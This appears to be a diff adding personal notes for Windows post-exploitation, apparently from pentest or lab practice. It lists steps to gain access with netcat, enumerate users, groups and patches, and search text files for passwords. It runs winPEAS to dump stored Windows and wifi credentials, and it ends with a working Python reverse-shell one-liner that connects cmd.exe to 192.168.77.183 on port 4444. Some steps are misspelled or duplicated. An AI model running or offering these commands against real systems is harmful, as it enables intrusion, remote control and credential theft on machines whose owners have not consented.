@@ -1,0 +1,33 @@
+Step 1) Connect the window machine in remote accs
+help of netcat
+Step 2) After get the connect to check the system info mation
+cmd: syseminfo
+Step 3) 
+whoami /priv - current user's privileges
+Step 4)
+net users - lists all users
+Step 5)
+net user <username> - lists details of a specific user
+Step 6)
+qwinsta - Other users logged in simultaneously
+Step 7)
+net localgroup - Groups available in system
+step 8)
+net localgroup <group-name> - list members of a specific group
+Step 9)
+systeminfo - gives all the info info about OS
+Step 10)
+hostname - hostname of system
+Step 11)
+findstr /si password *.txt - we're looking for the files which consist 'password' that too in text files
+wmic qfe get Caption,Description,HotFixID,InstalledOn - this tells about the security patches and related information
+Step 12) Using Winpeas to check the system infom
+cmd: winpeasany.exe systeminfo
+Step 13) Check the windows credentials
+cmd: winpeasany.exe systeminfo
+Step 14) check the windows credentials(it will also show the wifi information)
+cmd: winPEASany.exe windowscreds
+
+
+Reverse shell code or python
+python.exe -c "import socket,os,threading,subprocess as sp;p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect(('192.168.77.183',4444));threading.Thread(target=exec,args=(\"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\",globals()),daemon=True).start();threading.Thread(target=exec,args=(\"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\",globals())).start()"
